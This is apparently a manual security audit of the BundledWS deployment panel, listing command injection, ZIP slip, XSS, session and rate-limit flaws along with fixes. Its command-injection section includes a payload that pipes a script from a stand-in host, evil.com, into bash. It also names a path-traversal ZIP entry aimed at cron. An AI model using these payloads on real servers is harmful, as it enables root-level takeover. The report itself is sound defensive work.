# BundledWS — Comprehensive Security Vulnerability Report

**Target:** BundledWS v1.0.0 — Self-hosted Next.js deployment control panel
**Codebase:** C:\Users\Admin\Desktop\BWS\nextjs dashboard\NodeJsPanel\bundledws

---

## CRITICAL VULNERABILITIES

### C-1: Command Injection via Environment Variable Values (RCE)

**Severity:** CRITICAL (CVSS 9.8)
**Files:** [server.ts:428-435](src/server.ts#L428-L435)
**Type:** Remote Code Execution

**Description:** When setting or updating environment variables, user-supplied values are written directly into `/etc/profile.d/bundledws.sh` with shell double-quote wrapping, and then sourced via `execSync`. Although the values are placed inside double quotes (`export KEY="value"`), bash STILL interprets `$()`, backticks, and `${}` inside double quotes as command substitutions.

If a user sets a value like `"; $(id); "`, the resulting file line becomes:
```bash
export KEY=""; $(id); ""
```
And `$(id)` executes. The `execSync` call at line 435 sources this script:
```js
execSync("bash -c 'source /etc/profile.d/bundledws.sh 2>/dev/null || true'", { timeout: 5000 });
```

**Impact:** Full arbitrary command execution as root on the server.

**Exploitation path:** An authenticated user (or attacker with a valid session) PUTs to `/api/app/env` with `{"env": {"MYVAR": "\"; $(curl http://evil.com/shell.sh | bash); \""}}`.

**Code locations:**
- [`src/server.ts`](src/server.ts#L428-L435): Lines 428-435 — writing to `/etc/environment` and `/etc/profile.d/bundledws.sh`
- [`src/server.ts`](src/server.ts#L400-L405): Lines 400-405 — same pattern when DELETING env vars (existing values re-written to system files)

---

### C-2: Session Hijacking Over HTTP (No Secure Cookie Flag)

**Severity:** CRITICAL (CVSS 8.3)
**Files:** [server.ts:58-61](src/server.ts#L58-L61)
**Type:** Session Theft

**Description:** The panel runs on port 8080 over plain HTTP by default. The `Secure` flag on the session cookie is only set when `x-forwarded-proto: https` is detected. When users access `http://serverip:8080` directly, the session cookie is transmitted in cleartext with every request.

**Impact:** Anyone on the same network (LAN, WiFi, ISP) can capture the `bws_session` cookie via passive sniffing (ARP spoofing, packet capture) and hijack the user's session.

**Code:**
```js
function setCookie(res, token, expiresAt, secure = false) {
  const secureFlag = secure ? "; Secure" : "";
  res.setHeader("set-cookie", `bws_session=${token}; HttpOnly; SameSite=Lax; Path=/; Expires=${expiresAt.toUTCString()}${secureFlag}`);
}
```
When `isBehindHttpsProxy(req)` returns false (the typical case accessing port 8080 directly), no `Secure` flag is set.

---

### C-3: ZIP Slip — Path Traversal via Malicious ZIP Upload

**Severity:** HIGH (CVSS 8.1)
**Files:** [pipeline.ts:68](src/pipeline.ts#L68), [zip-inspect.ts](src/zip-inspect.ts)
**Type:** Arbitrary File Write

**Description:** The `unzip` command at pipeline.ts:68 extracts ZIP files without checking for path traversal in entry names (`../` or absolute paths). The `zip-inspect.ts` module validates entry count, size, compression ratio, and nested archives, but does NOT check for:
- Path traversal patterns (`../`, `..\\`)
- Absolute paths (`/etc/passwd`)
- Null bytes or other path injection

A ZIP file containing entries like `../../etc/cron.d/malicious` would be extracted outside the intended workspace directory.

**Code:**
```js
await runCmd("unzip", ["-o", ctx.zipPath, "-d", dir], ...);
```

**Impact:** An authenticated user can overwrite arbitrary files on the system (cron jobs, SSH authorized_keys, nginx configs, etc.) by uploading a specially crafted ZIP file.

---

## HIGH VULNERABILITIES

### H-1: Stored XSS in Deployment Log Modal

**Severity:** HIGH (CVSS 7.3)
**Files:** [spa.html:173](src/spa.html#L173)
**Type:** Cross-Site Scripting (Stored)

**Description:** The `showLogModal` function renders deployment logs using `innerHTML`, not `textContent`. Deployment logs contain shell output from `npm/pnpm/yarn install`, `npm run build`, and git operations. Any output containing HTML tags (e.g., from a malicious `package.json` `postinstall` script, error messages, or git output) would be rendered and executed as HTML/JavaScript.

**Code:**
```js
m.innerHTML = '<div class="modal">...<pre>' + (h || content) + "</pre></div>";
```
Where `content` is the raw log text, and `h` is the HTML-line-classified version using `innerHTML`.

**Impact:** An attacker who deploys a repository whose build output contains `<script>` tags or HTML event handlers can execute arbitrary JavaScript in the context of the panel when the admin views deployment logs.

**Note:** The primary deploy progress card uses `textContent` (safe). Only the modal version is vulnerable.

---

### H-2: Rate Limiting Bypass Behind Nginx

**Severity:** HIGH (CVSS 7.5)
**Files:** [server.ts:464](src/server.ts#L464)
**Type:** Authentication Bypass / Brute Force

**Description:** The rate limiter uses `req.socket.remoteAddress` as the IP key. When the panel is deployed behind Nginx (the recommended configuration), ALL requests appear to come from `127.0.0.1` (localhost). This means:
1. **ALL users share one rate limit bucket** — one aggressive user exhausts the limit for everyone
2. The login brute-force protection is completely **ineffective** behind Nginx
3. Deploy endpoints lose rate limiting protection

The `x-forwarded-for` header is never used for rate limiting despite being available.

**Code:** `const ip = req.socket.remoteAddress || "unknown";` (line 464)

---

### H-3: No Account Lockout / Brute Force Protection

**Severity:** HIGH (CVSS 7.4)
**Files:** [control-plane.ts:32-55](src/control-plane.ts#L32-L55)
**Type:** Authentication Bypass

**Description:** The login endpoint has no tracking of failed attempts per email address. The only protection is IP-based rate limiting, which is ineffective behind Nginx (see H-2). An attacker can brute-force passwords for known emails with no per-account throttling.

**Impact:** Password guessing for admin or customer accounts is feasible without triggering any alarms.

---

### H-4: Missing Security Headers

**Severity:** HIGH (CVSS 6.1)
**Files:** [server.ts:110-113](src/server.ts#L110-L113)
**Type:** Missing Security Controls

**Description:** The server does not set any of the following security headers:
- `Content-Security-Policy` — no CSP at all
- `X-Content-Type-Options: nosniff` — allows MIME-type sniffing
- `X-Frame-Options: DENY` — vulnerable to clickjacking
- `Referrer-Policy` — referrer leakage
- `Permissions-Policy` — no API permission restrictions
- `Strict-Transport-Security` (when HTTPS is available)

---

## MEDIUM VULNERABILITIES

### M-1: XSS Sinks via innerHTML with Error Messages

**Severity:** MEDIUM (CVSS 6.1)
**Files:** Multiple locations in [spa.html](src/spa.html)
**Type:** Cross-Site Scripting (Reflected)

**Description:** Multiple functions in the SPA use `innerHTML` to render error messages from API responses:
- `dashAction` (line 187): `ds2.innerHTML = '<div class="error-msg">' + e.message + "</div>"`
- `svcAction` (line 193): Same pattern
- `refreshStatus` (line 194): Same pattern
- `loadEnv` (line 196): Same pattern
- `addEnv` (line 198): Same pattern

While most server error messages are hardcoded, the env key validation error contains user input: `Invalid env key: ${key}` (server.ts:125). However, this currently flows through `showToast` (uses `textContent`), so it's not directly exploitable. The pattern is fragile — any future feature that reflects user input in error messages could trigger XSS.

---

### M-2: Admin Password Visible in Process List During Installation

**Severity:** MEDIUM (CVSS 5.5)
**Files:** [install.sh:587](install.sh#L587)
**Type:** Information Disclosure

**Description:** During installation, the admin password is passed as a CLI argument to `setup.js`:
```bash
BWS_DATA_DIR="$APP_DIR/data" node dist/setup.js "$ADMIN_EMAIL" "$ADMIN_PASS"
```
This makes the password visible in the system process list (`ps aux`) for any user with shell access. The `--password` CLI flag has the same issue.

**Also affected:** Admin email and Cloudflare API token may appear in process listings.

---

### M-3: Supply Chain Risk — No Integrity Verification

**Severity:** MEDIUM (CVSS 5.0)
**Files:** [install.sh:139](install.sh#L139), [install.sh:307](install.sh#L307)
**Type:** Supply Chain

**Description:** The install script downloads external resources without integrity verification:
1. NodeSource setup script (line 139): `curl -fsSL https://deb.nodesource.com/setup_22.x | bash -`
2. acme.sh installation (line 307): `curl -s https://get.acme.sh | sh`

Both are piped directly into shell/bash without checksum or GPG verification.

---

### M-4: ZIP Upload Race Condition — File Accessible Before Security Scan

**Severity:** MEDIUM (CVSS 4.3)
**Files:** [server.ts:293-304](src/server.ts#L293-L304)
**Type:** Time of Check / Time of Use

**Description:** Uploaded ZIP files are written to `/tmp/bundledws-uploads/upload_TIMESTAMP.zip` before the `inspectZip` security scan runs. Between write (line 296) and inspection (line 299), another process on the same system could read the un-inspected ZIP file.

---

### M-5: Static CSRF Token (Per-Session)

**Severity:** MEDIUM (CVSS 4.3)
**Files:** [auth.ts:13-21](src/auth.ts#L13-L21)
**Type:** Session Management

**Description:** The CSRF token is generated once per session and never rotated. If an attacker obtains the CSRF token (e.g., via `GET /api/me` response or network sniffing), it remains valid for the entire session lifetime (7 days).

---

### M-6: Env Variable Keys Not Validated on Delete

**Severity:** MEDIUM (CVSS 4.0)
**Files:** [server.ts:384](src/server.ts#L384)
**Type:** Input Validation

**Description:** The `POST /api/app/env/delete` endpoint does not call `validateEnvKey(key)` on the key being deleted. While this is a minor functional issue, it means the delete and update APIs have inconsistent validation.

---

## LOW VULNERABILITIES

### L-1: `.env` vs `.env.local` Confusion

**Severity:** LOW
**Files:** [pipeline.ts:324](src/pipeline.ts#L324), [server.ts:368,388,418](src/server.ts#L368)
**Type:** Logic Error

**Description:** The deployment pipeline writes env vars to `.env.local`, but the env management API reads from and writes to `.env`. Next.js reads `.env.local` first (higher priority), so deployed apps work. But the panel cannot display or manage env vars that were set during deployment (they're in `.env.local`, not `.env`).

---

### L-2: Weak Subdomain Randomness (32-bit)

**Severity:** LOW (CVSS 3.5)
**Files:** [install.sh:218](install.sh#L218)
**Type:** Predictable Resource

**Description:** The SSL subdomain is generated with `openssl rand -hex 4` (32 bits), giving only ~4 billion possible values. An attacker scanning the parent domain can enumerate subdomains. For a single-tenant system this is low-impact, but unnecessary when `crypto.randomBytes` could be used.

---

### L-3: Session Cookie Missing `__Host-` Prefix

**Severity:** LOW (CVSS 3.1)
**Files:** [server.ts:58-61](src/server.ts#L58-L61)
**Type:** Session Management

**Description:** The session cookie `bws_session` does not use the `__Host-` prefix, which would bind the cookie strictly to the origin domain and path, preventing subdomain-based cookie attacks.

---

### L-4: No Re-Authentication for Sensitive Operations

**Severity:** LOW
**Files:** [server.ts](src/server.ts)
**Type:** Missing Control

**Description:** Destructive operations (deploy, stop, restart, env changes) require only CSRF protection, not password re-entry. An unattended authenticated session can be abused by anyone with physical or remote access to the browser.

---

### L-5: Sensitive Credentials in Process Environment

**Severity:** LOW
**Files:** [install.sh](install.sh)
**Type:** Information Disclosure

**Description:** The Cloudflare API token is passed through environment variables to acme.sh (`CF_Token`, `CF_Zone_ID`). While these are properly `unset` after use, `/proc/*/environ` retains the values until the process exits. Any user with shell access on the system could read them during the brief window of execution.

---

### L-6: No Integrity Checks on Build Scripts from Deployed Repositories

**Severity:** LOW
**Files:** [security.ts](src/security.ts)
**Type:** Insufficient Defense

**Description:** The `runSecurityCheck` scans for known malicious patterns (cryptominers, reverse shells), but does NOT run `npm audit`, `pnpm audit`, or check for known vulnerable dependency versions. A deployed app could include dependencies with known vulnerabilities.

---

## SUMMARY TABLE

| ID | Vulnerability | Severity | Location | Requires Auth? |
|----|--------------|----------|----------|---------------|
| C-1 | Command Injection via env vars | **CRITICAL** | server.ts:428-435 | Yes (session) |
| C-2 | Session hijacking over HTTP | **CRITICAL** | server.ts:58-61 | No (passive) |
| C-3 | ZIP slip path traversal | **HIGH** | pipeline.ts:68 | Yes (session) |
| H-1 | Stored XSS in log modal | **HIGH** | spa.html:173 | Yes (session) |
| H-2 | Rate limiting bypass behind Nginx | **HIGH** | server.ts:464 | No |
| H-3 | No brute-force protection | **HIGH** | control-plane.ts:32 | No |
| H-4 | Missing security headers | **HIGH** | server.ts:110-113 | No |
| M-1 | XSS sinks via innerHTML | MEDIUM | spa.html:187+ | After auth |
| M-2 | Password in process list | MEDIUM | install.sh:587 | Local shell |
| M-3 | Supply chain risk | MEDIUM | install.sh:139,307 | N/A (install) |
| M-4 | ZIP upload race condition | MEDIUM | server.ts:293-304 | Yes (session) |
| M-5 | Static CSRF token | MEDIUM | auth.ts:13-21 | Yes (session) |
| M-6 | Missing env key validation | MEDIUM | server.ts:384 | Yes (session) |
| L-1 | .env vs .env.local confusion | LOW | pipeline.ts:324 | — |
| L-2 | Weak subdomain randomness | LOW | install.sh:218 | — |
| L-3 | Missing __Host- cookie prefix | LOW | server.ts:58-61 | — |
| L-4 | No re-auth for sensitive ops | LOW | server.ts | Yes (session) |
| L-5 | Credentials in process env | LOW | install.sh | Local shell |
| L-6 | No npm audit | LOW | security.ts | — |

---

## RECOMMENDED FIXES (Priority Order)

### P0 — Fix Immediately
1. **C-1 (Command Injection):** Escape env var values before writing to shell profiles. Use `JSON.stringify` or shell-escape. Better yet, don't write user env vars to system-level profile files at all — only write to the app's `.env` file.
2. **C-2 (Session Hijacking):** If deployed on HTTP, generate a unique per-request session binding (e.g., bind session to IP + User-Agent). Or add a warning that HTTP is insecure. Always set `Secure` when cookies are presented.

### P1 — Fix As Soon As Possible
3. **C-3 (ZIP slip):** Add path traversal detection to `zip-inspect.ts` — reject entries containing `../`, `..\\`, or starting with `/`.
4. **H-1 (XSS in logs):** Use `textContent` instead of `innerHTML` in `showLogModal`. Or sanitize log output with a proper HTML escaper.
5. **H-2 (Rate limiting):** Use `x-forwarded-for` header when behind Nginx, or pass the real IP via proxy protocol.

### P2 — Fix When Convenient
6. **H-3 (Brute force):** Add per-email failed login tracking and temporary lockout.
7. **H-4 (Security headers):** Add CSP, X-Content-Type-Options, X-Frame-Options, and other headers.
8. **M-1 (XSS sinks):** Replace all `innerHTML` usage with `textContent` in error message displays.
9. **M-2 (Password in process list):** Use stdin or a temp file instead of CLI arguments for setup.js.
10. **M-5 (CSRF rotation):** Rotate CSRF token after each mutation request.

---

*Report generated from manual code review of all source files in `src/`, `scripts/`, and `install.sh`.*
